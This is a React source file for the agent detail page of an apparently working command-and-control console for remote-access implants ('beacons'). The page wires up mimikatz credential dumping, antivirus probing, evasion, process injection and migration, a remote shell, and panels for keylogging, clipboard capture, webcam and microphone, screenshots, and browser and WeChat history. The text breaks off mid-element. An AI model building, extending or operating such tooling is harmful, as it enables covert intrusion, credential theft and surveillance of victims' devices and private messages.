import { registerFragment } from "@/lib/i18n";
import { enAgents } from "@/lib/i18n/fragments/en.agents";
import { enAI } from "@/lib/i18n/fragments/en.ai";
import { enCred } from "@/lib/i18n/fragments/en.cred";
import { enGenerate } from "@/lib/i18n/fragments/en.generate";
registerFragment(enAgents);
registerFragment(enAI);
registerFragment(enCred);
registerFragment(enGenerate);

import { useCallback, useEffect, useState, useMemo, useRef, memo, type ReactNode, lazy, Suspense } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Link } from "react-router-dom";
import { api, ApiError, pollTask } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { downloadText } from "@/lib/download";
import { ConfirmModal } from "@/components/ui/confirm-modal";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Skeleton } from "@/components/ui/skeleton";
import { PageContainer } from "@/components/ui/page-container";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { useI18n } from "@/lib/i18n";
import { logger } from "@/lib/logger";
import { useInteractStore } from "@/lib/interact-store";
import { Collapsible, CollapsibleContent } from "@/components/ui/collapsible";
import { Bug } from "lucide-react";
import { Banner } from "@/components/ui/banner";
import { AgentStatus, AgentDetail as AgentDetailExt, AgentTaskRecord } from "@/types/agent";

import AgentHeader from "./components/AgentHeader";
import AgentDetailChrome from "./components/AgentDetailChrome";
import AgentStatsGrid from "./components/AgentStatsGrid";
import AgentTaskList from "./components/AgentTaskList";
import AgentScreenshots from "./components/AgentScreenshots";
import AgentChildList from "./components/AgentChildList";
import AgentStatusBar from "./components/AgentStatusBar";
import QuickShellSection from "./components/QuickShellSection";
import { AISuggestCard } from "./components/AISuggestCard";
import NotesTagsSection from "./components/NotesTagsSection";
// Below-fold sections load on demand so the detail chunk parses faster.
const ProcessSection = lazy(() => import("./components/ProcessSection"));
const ConnectionLogSection = lazy(() => import("./components/ConnectionLogSection"));
const EvasionSection = lazy(() => import("./components/EvasionSection"));
const InjectSection = lazy(() => import("./components/InjectSection"));
const TimelineSection = lazy(() => import("./components/TimelineSection"));
const BrowserHistorySection = lazy(() => import("./components/BrowserHistorySection"));
const WindowSection = lazy(() => import("./components/WindowSection"));
const WeChatHistorySection = lazy(() => import("./components/WeChatHistorySection"));
const KeyloggerSection = lazy(() => import("./components/KeyloggerSection"));
const ClipboardSection = lazy(() => import("./components/ClipboardSection"));
const WallpaperSection = lazy(() => import("./components/WallpaperSection"));
const WebcamMicSection = lazy(() => import("./components/WebcamMicSection"));
const ScreenTriggerSection = lazy(() => import("./components/ScreenTriggerSection"));
const RegistrySection = lazy(() => import("./components/RegistrySection"));
const ReconSection = lazy(() => import("./components/ReconSection"));
const HostInfoCard = lazy(() => import("./components/HostInfoCard").then((m) => ({ default: m.HostInfoCard })));
import {
  AGENT_DETAIL_TABS,
  isAgentDetailTabId,
  sectionSupported,
  type AgentDetailTabId,
} from "./components/agent-detail-tabs";
import {
  buildAgentCopyText,
  buildAgentMarkdown,
  toLocalDateInput,
  type AgentDetailModel,
  type AgentDetailResponse,
  type LogEntry,
  type TaskEntry,
} from "./components/agent-detail-utils";
import { useAgentDetail } from "./hooks/useAgentDetail";
import { useAgentScreenshots } from "./hooks/useAgentScreenshots";
import { useAgentQuickShell } from "./hooks/useAgentQuickShell";
import { useAgentProcessTree } from "./hooks/useAgentProcessTree";
import { useAgentNotes } from "./hooks/useAgentNotes";
import { useAgentDangerActions } from "./hooks/useAgentDangerActions";
import { useAgentTaskSync } from "./hooks/useAgentTaskSync";
import { useMutation } from "@/lib/hooks/useMutation";
import { useErrorToast } from "@/lib/hooks/useErrorToast";
import { usePersistedState } from "@/lib/hooks/usePersistedState";
import { credActionBlockReason, credActionEndpoint, hasMimikatzModule, parseModuleNames, type ModuleAvailability } from "@/lib/cred-quality";
import { sessionActionQuality } from "./components/session-quality";
import { implantBlocksDest, isCImplant } from "@/lib/implant-version";

interface BeaconDetailPageProps {
  agentId?: string;
  onClose?: () => void;
}

export default memo(function BeaconDetailPage({ agentId: agentIdProp, onClose }: BeaconDetailPageProps = {}) {
  const { t } = useI18n();
  const { toastError, warnError } = useErrorToast();
  const params = useParams();
  const navigate = useNavigate();
  const id = agentIdProp || (params?.id as string);
  const embedded = Boolean(onClose);
  const onCloseRef = useRef(onClose);
  onCloseRef.current = onClose;
  const [confirmUninstall, setConfirmUninstall] = useState(false);
  const [confirmKill, setConfirmKill] = useState(false);
  const [confirmKillDate, setConfirmKillDate] = useState(false);
  const [killDateValue, setKillDateValue] = useState("");
  const [confirmClearKillDate, setConfirmClearKillDate] = useState(false);
  const [confirmMigrate, setConfirmMigrate] = useState(false);
  const [migratePath, setMigratePath] = useState("");
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [expandedTask, setExpandedTask] = useState<string | number | null>(null);
  const [lbOpen, setLbOpen] = useState(false);
  const [lbIndex, setLbIndex] = useState(0);
  const lbOpenRef = useRef(false);
  lbOpenRef.current = lbOpen;
  const confirmOpen = confirmUninstall || confirmKill || confirmKillDate || confirmClearKillDate || confirmMigrate;
  const confirmOpenRef = useRef(confirmOpen);
  confirmOpenRef.current = confirmOpen;
  const [childrenExpanded, setChildrenExpanded] = usePersistedState(`agents.detail.${id}.children`, false);

  // Tab state: ?tab= deep link wins, otherwise the per-agent remembered tab.
  const [searchParams, setSearchParams] = useSearchParams();
  const [persistedTab, setPersistedTab] = usePersistedState<AgentDetailTabId>(`agents.detail.${id}.tab`, "overview");
  const urlTab = searchParams.get("tab");
  const activeTab: AgentDetailTabId = isAgentDetailTabId(urlTab)
    ? urlTab
    : (isAgentDetailTabId(persistedTab) ? persistedTab : "overview");
  const handleTabChange = useCallback((v: string) => {
    if (!isAgentDetailTabId(v)) return;
    setPersistedTab(v);
    setSearchParams((prev) => {
      const next = new URLSearchParams(prev);
      next.set("tab", v);
      return next;
    }, { replace: true });
  }, [setPersistedTab, setSearchParams]);
  const handleTabChangeRef = useRef(handleTabChange);
  handleTabChangeRef.current = handleTabChange;

  const { data, setData, loading, loadError, reload: loadDetail, reloadThrottled } = useAgentDetail<AgentDetailResponse>(id);
  const status = (data?.agent?.status || "offline") as AgentStatus;
  const { screenshots, newScreenshots } = useAgentScreenshots(id, status === "online");
  useAgentTaskSync(id, status === "online", setData, reloadThrottled);

  const {
    command: shellCommand,
    setCommand: setShellCommand,
    shell: shellInterpreter,
    setShell: setShellInterpreter,
    history: shellHistory,
    sending: shellSending,
    expanded: shellExpanded,
    setExpanded: setShellExpanded,
    sendCommand: sendShellCommand,
  } = useAgentQuickShell(id, data?.agent?.os, t("agents.detail_command_sent"), t("agents.detail_command_send_failed"), `agents.detail.${id}.quick_shell`);

  const [sleepValue, setSleepValue] = useState(0);
  const [jitterValue, setJitterValue] = useState(0);
  const sleepDirtyRef = useRef(false);

  // Per-agent actions. The id effect below calls reset() on both, so a
  // completion that lands after the route id changed is discarded: it cannot
  // toast (or reload) against the agent the operator is now looking at.
  const {
    mutate: saveSleep,
    isPending: sleepSaving,
    reset: resetSleep,
  } = useMutation({
    fn: async ({ interval, jitter }: { interval: number; jitter: number }) => {
      await api.postJson(paths.agents.setSleep(id), { interval, jitter });
    },
    onSuccess: () => {
      toast.success(t("agents.sleep_updated").replace("{name}", data?.agent?.hostname || ""));
      sleepDirtyRef.current = false;
      void Promise.resolve(loadDetail());
    },
    onError: (e) => toastError(e, "agents.sleep_failed"),
  });
  const {
    mutate: runDiagnose,
    isPending: diagnosing,
    reset: resetDiagnose,
  } = useMutation({
    fn: async () => {
      const res = await api.post(paths.agents.diagnose(id), {}) as { count?: number };
      return res;
    },
    onSuccess: (res) => {
      toast.success(t("agents.detail_diagnose_queued").replace("{count}", String(res.count ?? 5)));
    },
    onError: (e) => toastError(e, "agents.detail_diagnose_failed"),
  });

  // Route reuse: /beacons/[id] keeps the same component instance when
  // navigating parent → child, so per-agent editor state (dirty flag,
  // expanded task, etc.) must reset on id change — otherwise agent A's
  // unsent sleep edits get POSTed to agent B.
  useEffect(() => {
    sleepDirtyRef.current = false;
    setExpandedTask(null);
    resetSleep();
    resetDiagnose();
  }, [id, resetSleep, resetDiagnose]);

  // Lightbox index clamp: screenshots refresh (WS push / deletion) can
  // shrink the array while the viewer is open — without this, lbIndex
  // pointed past the end and rendered a blank stage with a wrong counter.
  useEffect(() => {
    if (!lbOpen || lbIndex === null) return;
    if (!lbOpen) return;
    const count = screenshots.length;
    if (count === 0) {
      setLbOpen(false);
    } else if (lbIndex > count - 1) {
      setLbIndex(count - 1);
    }
  }, [lbOpen, lbIndex, screenshots.length]);

  const [credCount, setCredCount] = useState<number | null>(null);
  const [mimikatzReady, setMimikatzReady] = useState<ModuleAvailability>(null);
  const [avProducts, setAvProducts] = useState<string[]>([]);
  const [avFetched, setAvFetched] = useState(false);
  const [avStatus, setAvStatus] = useState<"unknown" | "empty" | "products">("unknown");

  const { snapshot: processSnapshot, loading: processLoading, collecting: processCollecting, loadFailed, expanded: processExpanded, setExpanded: setProcessExpanded, load: loadProcessList, refresh: refreshProcessList } = useAgentProcessTree(
    id,
    `agents.detail.${id}.process`,
  );
  const {
    editing: editingNote,
    tags: editTags,
    setTags: setEditTags,
    notes: editNotes,
    setNotes: setEditNotes,
    saving: savingNote,
    startEditing: startEditNotes,
    cancelEditing: cancelEditNotes,
    save: handleSaveNote,
  } = useAgentNotes(id, loadDetail);
  const { busy: dangerBusy, killAgent: runKillAgent, uninstallAgent: runUninstallAgent, migrateAgent: runMigrateAgent, setKillDate: runSetKillDate, clearKillDate: runClearKillDate } = useAgentDangerActions(id, loadDetail);

  useEffect(() => {
    if (!lbOpen) return;
    const h = (e: KeyboardEvent) => {
      if (e.key === "Escape") setLbOpen(false);
      else if (e.key === "ArrowLeft") setLbIndex((i) => Math.max(0, i - 1));
      else if (e.key === "ArrowRight") setLbIndex((i) => Math.min(screenshots.length - 1, i + 1));
    };
    window.addEventListener("keydown", h);
    return () => window.removeEventListener("keydown", h);
  }, [lbOpen, screenshots.length]);

  useEffect(() => {
    const handleKeydown = (e: KeyboardEvent) => {
      const tag = (e.target as HTMLElement).tagName;
      if (tag === "INPUT" || tag === "TEXTAREA" || tag === "SELECT") return;
      if (lbOpenRef.current) return;
      if (confirmOpenRef.current) return;
      if (onCloseRef.current && e.key === "Escape") { onCloseRef.current(); return; }
      if (e.key === "s") navigate(`/beacons/${id}/shell`);
      else if (e.key === "f") navigate(`/beacons/${id}/files`);
      else if (e.key === "d") navigate(`/beacons/${id}/screen`);
      else if (e.key === "Escape") navigate("/beacons");
      else if (e.key >= "1" && e.key <= String(AGENT_DETAIL_TABS.length)) {
        const tab = AGENT_DETAIL_TABS[Number(e.key) - 1];
        if (tab) handleTabChangeRef.current(tab.id);
      }
    };
    window.addEventListener("keydown", handleKeydown);
    return () => window.removeEventListener("keydown", handleKeydown);
  }, [navigate, id]);

  // t only appears in this effect's catch toast, so keep the effect stable
  // on [id] via a ref. Named tRef so the i18n checker's ref-usage pattern
  // sees the lookup.
  const tRef = useRef(t);
  tRef.current = t;

  useEffect(() => {
    if (!id) return;
    const controller = new AbortController();
    api.get(paths.credentials.byAgent(id, 1), { signal: controller.signal })
      .then((r: { total?: number }) => { if (r && typeof r.total === "number") setCredCount(r.total); })
      .catch((e) => { if (e.name !== 'AbortError') toast.error(tRef.current("agents.detail_creds_load_failed")); });
    return () => controller.abort();
  }, [id]);

  useEffect(() => {
    const controller = new AbortController();
    api.get(paths.modules.list, { signal: controller.signal })
      .then((r) => setMimikatzReady(hasMimikatzModule(parseModuleNames(r))))
      // Leave availability unknown: a failed module-list query must not assert
      // that the agent is missing mimikatz.
      .catch(() => setMimikatzReady(null));
    return () => controller.abort();
  }, []);

  // Auto-fetch running AV (security hostinfo) — show in header without manual click
  useEffect(() => {
    if (!id || status !== "online" || avFetched) return;
    const controller = new AbortController();
    let cancelled = false;
    (async () => {
      try {
        const fd = new FormData();
        fd.set("category", "security");
        const dispatched = await api.postFormData(paths.agents.cmd(id, "hostinfo"), fd) as { task_id?: number };
        const taskId = dispatched.task_id;
        if (!taskId) return;
        await pollTask(id, taskId, { timeoutMs: 60000, signal: controller.signal });
        const task = await api.get(paths.agents.task(id, String(taskId)), { signal: controller.signal }) as { result?: string; data?: { result?: string } };
        const taskResult = (task as unknown as { result?: string }).result ?? task.data?.result ?? "";
        if (!taskResult || cancelled) return;
        const parsed = JSON.parse(taskResult) as { sections?: Record<string, { av_products?: Array<{ name?: string }> }> };
        const sec = parsed.sections?.security || (parsed.sections as Record<string, unknown>)?.Security as unknown as { av_products?: Array<{ name?: string }> } || {};
        const av = Array.isArray(sec.av_products) ? sec.av_products : [];
        const names = av.map((a) => String(a.name || "")).filter(Boolean);
        if (!cancelled) {
          setAvProducts(names);
          setAvStatus(names.length > 0 ? "products" : "empty");
          setAvFetched(true);
        }
      } catch (e) {
        // A failed probe must not read as "this host has no security products".
        if ((e as Error).name !== "AbortError" && !cancelled) {
          setAvStatus("unknown");
          setAvFetched(true);
        }
      }
    })();
    return () => { cancelled = true; controller.abort(); };
  }, [id, status, avFetched]);

  useEffect(() => {
    if (!data?.agent || sleepDirtyRef.current) return;
    setSleepValue(data.agent.current_interval ?? 0);
    setJitterValue(data.agent.current_jitter ?? 0);
    // eslint-disable-next-line react-hooks/exhaustive-deps -- synced to the server values rather than the data object identity; sleepDirtyRef already guards unsaved edits.
  }, [data?.agent?.current_interval, data?.agent?.current_jitter]);

  const agent = data?.agent || ({} as AgentDetailModel);
  const isC = isCImplant((agent as { version?: string; Version?: string }).version ?? (agent as { Version?: string }).Version);
  const tasks: TaskEntry[] = useMemo(() => data?.tasks || [], [data?.tasks]);
  const rawTags = agent.tags || "";
  const tagsList = useMemo(() => (rawTags ? rawTags.split(",").map((tag) => tag.trim()).filter(Boolean) : []), [rawTags]);
  const note = agent.note || "";
  const handleStartEditNotes = useCallback(() => startEditNotes(rawTags, note), [startEditNotes, rawTags, note]);
  const childAgents: AgentDetailModel[] = data?.children || [];
  const logs: LogEntry[] = data?.logs || [];
  const totalTasks = data?.total_tasks ?? tasks.length;
  const completedTasks = data?.completed_tasks ?? 0;
  const pendingTasks = data?.pending_tasks ?? 0;
  const failedTasks = data?.failed_tasks ?? 0;

  const handleDiagnose = useCallback(() => {
    void runDiagnose();
  }, [runDiagnose]);

  const quickAction = useCallback(
    async (action: string, label: string) => {
      const reason = credActionBlockReason(action, mimikatzReady);
      if (reason === "missing_module") {
        toast.error(t("cred.missing_module"));
        return;
      }
      if (reason === "module_status_unknown") {
        toast.error(t("cred.module_status_unknown"));
        return;
      }
      if (implantBlocksDest(agent.version, sessionActionQuality(action))) {
        toast.error(t("agents.version_unknown_dest"));
        return;
      }
      setActionLoading(action);
      try {
        const suffix = credActionEndpoint(action) || (action === "beacon_now" ? "beacon_now" : "");
        const data = suffix
          ? await api.post(paths.agents.cmd(id, suffix), {})
          : await api.postJson(paths.toolkit.action(id), { action, param: "", shell: "" });
        const taskId = Number((data as { task_id?: number }).task_id);
        const queued = Number.isFinite(taskId) && taskId > 0;
        const kind = queued ? useInteractStore.getState().revealTask(id, taskId) : "offer";
        toast.success(t("agents.detail_action_queued", { label }), {
          action: kind === "offer" && queued
            ? {
                label: t("agents.dock_view_result"),
                onClick: () => useInteractStore.getState().open(id, { tab: "tasks", expandedTaskId: taskId }),
              }
            : undefined,
        });
      } catch (err) {
        if (err instanceof ApiError && err.status === 409) {
          // Approval conflict: a command-layer outcome, not a failure, so it
          // keeps the warning tone (text resolved through the shared rules).
          warnError(err, "agents.detail_action_failed", { label });
        } else {
          logger.error("quickAction failed", err);
          toastError(err, "agents.detail_action_failed", { label });
        }
      } finally {
        setActionLoading(null);
      }
    },
    [id, t, mimikatzReady, agent.version, toastError, warnError],
  );

  const handleApplySleep = useCallback(() => {
    // Same bounds as the agents-list quick-sleep path: HTML min/max don't
    // stop typing, and Number("") === 0 would silently flip a beacon toward
    // real-time cadence.
    const interval = Number(sleepValue);
    const jitter = Number(jitterValue);
    if (!Number.isFinite(interval) || interval < 1 || interval > 86400 ||
        !Number.isFinite(jitter) || jitter < 0 || jitter > 100) {
      toast.error(t("agents.sleep_invalid"));
      return;
    }
    void saveSleep({ interval, jitter });
  }, [t, sleepValue, jitterValue, saveSleep]);

  const exportJSON = useCallback(() => {
    if (!data) return;
    downloadText(JSON.stringify(data, null, 2), `agent-${id}.json`, "application/json");
  }, [data, id]);

  const exportMarkdown = useCallback(() => {
    if (!data) return;
    downloadText(buildAgentMarkdown(data), `agent-${id}.md`, "text/markdown");
  }, [data, id]);

  const copyAllInfo = useCallback(async () => {
    if (!data) return;
    try {
      await navigator.clipboard.writeText(buildAgentCopyText(data));
      toast.success(t("agents.detail_copied"));
    } catch {
      toast.error(t("agents.detail_copy_failed"));
    }
  }, [data, t]);

  const onToggleExpand = useCallback((taskId: string | number) => {
    setExpandedTask((cur) => (String(cur ?? "") === String(taskId) ? null : taskId));
  }, []);

  const onOpenLightbox = useCallback((idx: number) => {
    setLbIndex(idx);
    setLbOpen(true);
  }, []);

  const onCloseLightbox = useCallback(() => setLbOpen(false), []);
  const onPrevLightbox = useCallback(() => setLbIndex((i) => Math.max(0, i - 1)), []);
  const onNextLightbox = useCallback(
    () => setLbIndex((i) => Math.min(screenshots.length - 1, i + 1)),
    [screenshots.length],
  );

  const handleToggleChildren = useCallback(() => setChildrenExpanded((v) => !v), [setChildrenExpanded]);

  const handleSetKillDate = useCallback(() => {
    const kd = agent?.kill_date;
    if (kd) {
      const d = new Date(kd);
      setKillDateValue(Number.isNaN(d.getTime()) ? kd.substring(0, 10) : toLocalDateInput(d));
    } else {
      const tomorrow = new Date();
      tomorrow.setDate(tomorrow.getDate() + 1);
      setKillDateValue(toLocalDateInput(tomorrow));
    }
    setConfirmKillDate(true);
  }, [agent?.kill_date]);

  const handleClearKillDate = useCallback(() => setConfirmClearKillDate(true), []);

  const handleToggleProcess = useCallback(
    (open: boolean) => {
      setProcessExpanded(open);
      if (open && !processLoading) loadProcessList();
    },
    [processLoading, loadProcessList, setProcessExpanded],
  );

  const handleKill = useCallback(() => setConfirmKill(true), []);
  const handleUninstall = useCallback(() => setConfirmUninstall(true), []);
  const handleMigrate = useCallback(() => {
    setMigratePath("");
    setConfirmMigrate(true);
  }, []);
  const handlePopOut = useCallback(() => useInteractStore.getState().open(id, { tab: "shell" }), [id]);
  const handleSleepChange = useCallback((v: number) => { sleepDirtyRef.current = true; setSleepValue(v); }, []);
  const handleJitterChange = useCallback((v: number) => { sleepDirtyRef.current = true; setJitterValue(v); }, []);

  const wrap = (body: ReactNode) => (
    <div className={cn("flex min-h-0 flex-col bg-background", embedded && "h-full")}>
      <AgentDetailChrome
        agentId={id}
        hostname={data?.agent?.hostname}
        status={data?.agent?.status as AgentStatus | undefined}
        embedded={embedded}
        onClose={onClose}
      />
      <div className={cn("min-h-0", embedded && "flex-1 overflow-y-auto px-4 py-4 sm:px-6 sm:py-5 lg:px-8 lg:py-6")}>
        {body}
      </div>
    </div>
  );

  if (loading) {
    return wrap(
      <PageContainer embedded={embedded}>
        <div className="flex flex-col gap-(--page-gap)">
          <Skeleton className="h-4 w-24" />
          <Card className="p-(--card-spacing)"><div className="flex items-center gap-4">
            <Skeleton className="size-14 rounded-lg" />
            <div className="space-y-2"><Skeleton className="h-5 w-40" /><Skeleton className="h-3 w-60" /></div>
          </div></Card>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">{[1,2,3,4].map((n) => (<Card key={n} className="p-(--card-spacing)"><Skeleton className="h-3 w-16 mb-2" /><Skeleton className="h-4 w-24" /></Card>))}</div>
        </div>
      </PageContainer>,
    );
  }

  if (!data) {
    return wrap(
      <PageContainer embedded={embedded}>
        <div className="text-center py-20">
          <Bug className="size-4" />
          <h2 className="text-xl font-semibold tracking-tight text-foreground leading-tight mb-2">{loadError ? t("agents.detail_load_failed") : t("agents.detail_not_found")}</h2>
          <p className="text-sm text-muted-foreground mb-6">{loadError ? t("agents.detail_load_error_msg") : t("agents.detail_not_found_msg")}</p>
          <div className="flex items-center justify-center gap-3">
            {loadError && <Button variant="default" onClick={() => loadDetail()}>{t("agents.detail_retry")}</Button>}
            {onClose ? (
              <Button variant="default" onClick={onClose}>{t("agents.detail_back_to_agents")}</Button>
            ) : (
              <Button render={<Link to="/beacons" />}>{t("agents.detail_back_to_agents")}</Button>
            )}
          </div>
        </div>
      </PageContainer>,
    );
  }

  return wrap(
    <PageContainer className="relative" embedded={embedded}>
      {loadError && (
        <Banner tone="destructive" action={<Button variant="ghost" size="sm" onClick={() => loadDetail()}>{t("agents.detail_retry")}</Button>}>
          {t("agents.detail_load_error_msg")}
        </Banner>
      )}
      {!embedded && <AgentStatusBar agent={agent as Partial<AgentDetailExt>} agentId={id} status={status} />}
      <AgentHeader
        agent={agent as Partial<AgentDetailExt>}
        agentId={id}
        status={status}
        actionLoading={actionLoading}
        onQuickAction={quickAction}
        credCount={credCount}
        mimikatzReady={mimikatzReady}
        avProducts={avProducts}
        avStatus={avStatus}
        onKill={handleKill}
        onUninstall={handleUninstall}
        onMigrate={handleMigrate}
        onPopOut={handlePopOut}
      />

      {agent.kill_date && (() => {
            const kd = new Date(agent.kill_date);
            const days = Math.ceil((kd.getTime() - Date.now()) / 86400000);
            if (days <= 7 && days >= 0) return <Banner tone={days <= 2 ? "destructive" : "warning"}>{t("agents.detail_kill_date_countdown").replace("{days}", String(days))}</Banner>;
            if (days < 0) return <Banner tone="destructive">{t("agents.detail_kill_date_expired")}</Banner>;
            return null;
          })()}
      <div className="grid grid-cols-1 gap-6 lg:grid-cols-[minmax(0,1fr)_320px]">
        {/* ── Main column: tabbed live sections ── */}
        <div className="min-w-0">
          <Tabs value={activeTab} onValueChange={handleTabChange}>
            <TabsList sticky aria-label={t("agents.detail_tabs_aria")}>
              {AGENT_DETAIL_TABS.map((tab, i) => (
                <TabsTrigger key={tab.id} value={tab.id} title={`${i + 1}`}>
                  {t(tab.labelKey)}
                </TabsTrigger>
              ))}
            </TabsList>

            <TabsContent value="overview">
              <div className="flex gap-2 mb-4">
                <Button size="sm" variant="outline" onClick={handleDiagnose} disabled={diagnosing || status !== "online"}>{diagnosing ? t("agents.detail_diagnosing") : t("agents.detail_diagnose")}</Button>
                <span className="text-xs text-muted-foreground self-center">{t("agents.detail_diagnose_hint")}</span>
              </div>
              {isC && (
                <Banner tone="warning" className="mb-4">{t("agents.detail_c_implant_notice")}</Banner>
              )}
              <Suspense fallback={null}><HostInfoCard agentId={id} online={status === "online"} /></Suspense>
            </TabsContent>

            <TabsContent value="tasks">
              <AgentTaskList
                tasks={tasks as AgentTaskRecord[]}
                agentId={id}
                expandedTaskId={expandedTask}
                onToggleExpand={onToggleExpand}
                totalTasks={totalTasks}
                completedTasks={completedTasks}
                pendingTasks={pendingTasks}
                failedTasks={failedTasks}
              />
            </TabsContent>

            <TabsContent value="recon">
              {sectionSupported("recon", { isCImplant: isC }) && (<Suspense fallback={null}><ReconSection agentId={id} online={status === "online"} /></Suspense>)}
              {sectionSupported("windows", { isCImplant: isC }) && (<Suspense fallback={null}><WindowSection agentId={id} online={status === "online"} /></Suspense>)}
              <Suspense fallback={null}>
                <ProcessSection
                  agentId={id}
                  online={status === "online"}
                  snapshot={processSnapshot}
                  loading={processLoading}
                  collecting={processCollecting}
                  loadFailed={loadFailed}
                  expanded={processExpanded}
                  onToggle={handleToggleProcess}
                  onRetry={() => { void loadProcessList(); }}
                  onRefresh={refreshProcessList}
                />
              </Suspense>
            </TabsContent>

            <TabsContent value="evasion">
              {sectionSupported("evasion", { isCImplant: isC }) && (<Suspense fallback={null}><EvasionSection agentId={id} online={status === "online"} /></Suspense>)}
              {sectionSupported("inject", { isCImplant: isC }) && (<Suspense fallback={null}><InjectSection agentId={id} online={status === "online"} osType={agent.os} /></Suspense>)}
            </TabsContent>

            <TabsContent value="collect">
              {sectionSupported("screenshots", { isCImplant: isC }) && (
              <AgentScreenshots
                screenshots={screenshots}
                newScreenshots={newScreenshots}
                agentId={id}
                lightboxIdx={lbOpen ? lbIndex : null}
                onOpenLightbox={onOpenLightbox}
                onCloseLightbox={onCloseLightbox}
                onPrevLightbox={onPrevLightbox}
                onNextLightbox={onNextLightbox}
              />
              )}

              {sectionSupported("screentrigger", { isCImplant: isC }) && (<Suspense fallback={null}><ScreenTriggerSection agentId={id} online={status === "online"} /></Suspense>)}

              {sectionSupported("registry", { isCImplant: isC }) && (<Suspense fallback={null}><RegistrySection agentId={id} online={status === "online"} /></Suspense>)}

              {sectionSupported("browserhistory", { isCImplant: isC }) && (<Suspense fallback={null}><BrowserHistorySection agentId={id} online={status === "online"} /></Suspense>)}

              {sectionSupported("wechathistory", { isCImplant: isC }) && (<Suspense fallback={null}><WeChatHistorySection agentId={id} online={status === "online"} /></Suspense>)}

              {sectionSupported("keylogger", { isCImplant: isC }) && (<Suspense fallback={null}><KeyloggerSection agentId={id} online={status === "online"} /></Suspense>)}

              {sectionSupported("clipboard", { isCImplant: isC }) && (<Suspense fallback={null}><ClipboardSection agentId={id} online={status === "online"} /></Suspense>)}

              {sectionSupported("wallpaper", { isCImplant: isC }) && (<Suspense fallback={null}><WallpaperSection agentId={id} online={status === "online"} /></Suspense>)}

              {sectionSupported("webcammic", { isCImplant: isC }) && (<Suspense fallback={null}><WebcamMicSection agentId={id} online={status === "online"} /></Suspense>)}
            </TabsContent>

            <TabsContent value="timeline">
              <Suspense fallback={null}><TimelineSection agentId={id} online={status === "online"} /></Suspense>
            </TabsContent>
          </Tabs>
        </div>

        {/* ── Right rail: reference + quick controls ── */}
        <div className="min-w-0 lg:sticky lg:top-2 lg:max-h-[calc(100dvh-6rem)] lg:overflow-y-auto lg:pr-0.5">
          <AISuggestCard agentId={id} online={status === "online"} />
          <AgentStatsGrid
            agent={agent as Partial<AgentDetailExt>}
            uptime={data?.uptime}
            timeSinceLastSeen={data?.time_since_last_seen}
            sleepValue={sleepValue}
            jitterValue={jitterValue}
            onSleepChange={handleSleepChange}
            onJitterChange={handleJitterChange}
            onApplySleep={handleApplySleep}
            sleepSaving={sleepSaving}
            status={status}
            childAgents={childAgents}
            childrenExpanded={childrenExpanded}
            onToggleChildren={handleToggleChildren}
            onExportJSON={exportJSON}
            onExportMarkdown={exportMarkdown}
            onCopyAllInfo={copyAllInfo}
            killDate={agent?.kill_date}
            onSetKillDate={handleSetKillDate}
            onClearKillDate={handleClearKillDate}
            rail
          />

          <Collapsible open={childrenExpanded} onOpenChange={setChildrenExpanded}>
            <CollapsibleContent>
              <AgentChildList childAgents={childAgents} />
            </CollapsibleContent>
          </Collapsible>

          {status === "online" && (
            <QuickShellSection
              expanded={shellExpanded}
              onExpandedChange={setShellExpanded}
              shellInterpreter={shellInterpreter}
              onShellChange={setShellInterpreter}
              command={shellCommand}
              onCommandChange={setShellCommand}
              history={shellHistory}
              sending={shellSending}
              onSend={sendShellCommand}
              os={agent.os}
            />
          )}

          <NotesTagsSection
            editing={editingNote}
            tags={editTags}
            onTagsChange={setEditTags}
            notes={editNotes}
            onNotesChange={setEditNotes}
            saving={savingNote}
            onStartEdit={handleStartEditNotes}
            onCancelEdit={cancelEditNotes}
            onSave={handleSaveNote}
            displayTags={tagsList}
            note={note}
          />

          <Suspense fallback={null}><ConnectionLogSection logs={logs} /></Suspense>
        </div>
      </div>

      <ConfirmModal open={confirmKill} title={t("agents.kill_agent")} message={t("agents.kill_msg")} confirmText={t("agents.kill")} danger onConfirm={async () => { if (await runKillAgent()) setConfirmKill(false); }} onCancel={() => setConfirmKill(false)} />
      <ConfirmModal open={confirmUninstall} title={t("agents.uninstall_agent")} message={t("agents.uninstall_msg")} confirmText={t("agents.uninstall")} danger onConfirm={async () => { if (await runUninstallAgent()) setConfirmUninstall(false); }} onCancel={() => setConfirmUninstall(false)} />
      {confirmKillDate && (
        <Dialog open={confirmKillDate} onOpenChange={(v) => !v && setConfirmKillDate(false)}>
          <DialogContent size="md" className="w-80 gap-0">
            <DialogHeader>
              <DialogTitle>{t("agents.detail_set_kill_date")}</DialogTitle>
            </DialogHeader>
            <p className="text-xs text-muted-foreground mb-3">{t("agents.detail_kill_date_msg")}</p>
            <Input type="date" value={killDateValue} onChange={(e) => setKillDateValue(e.target.value)} className="mb-3 text-sm" />
            <DialogFooter>
              <Button variant="ghost" size="sm" onClick={() => setConfirmKillDate(false)} disabled={!!dangerBusy}>{t("agents.detail_cancel")}</Button>
              <Button variant="destructive" size="sm" onClick={async () => { if (await runSetKillDate(killDateValue)) setConfirmKillDate(false); }} disabled={!!dangerBusy}>{t("agents.detail_set_kill_date")}</Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      )}
      <ConfirmModal open={confirmClearKillDate} title={t("agents.detail_clear_kill_date")} message={t("agents.detail_clear_kill_date_msg")} confirmText={t("agents.detail_clear")} danger onConfirm={async () => { if (await runClearKillDate()) setConfirmClearKillDate(false); }} onCancel={() => setConfirmClearKillDate(false)} />
      {confirmMigrate && (
        <Dialog open={confirmMigrate} onOpenChange={(v) => !v && setConfirmMigrate(false)}>
          <DialogContent size="md" className="w-96 gap-0">
            <DialogHeader>
              <DialogTitle>{t("agents.migrate_agent")}</DialogTitle>
            </DialogHeader>
            <p className="text-xs text-muted-foreground mb-3">{t("agents.migrate_msg")}</p>
            <span className="block text-xs font-medium text-muted-foreground mb-1.5">{t("agents.migrate_path_label")}</span>
            <Input
              type="text"
              value={migratePath}
              onChange={(e) => setMigratePath(e.target.value)}
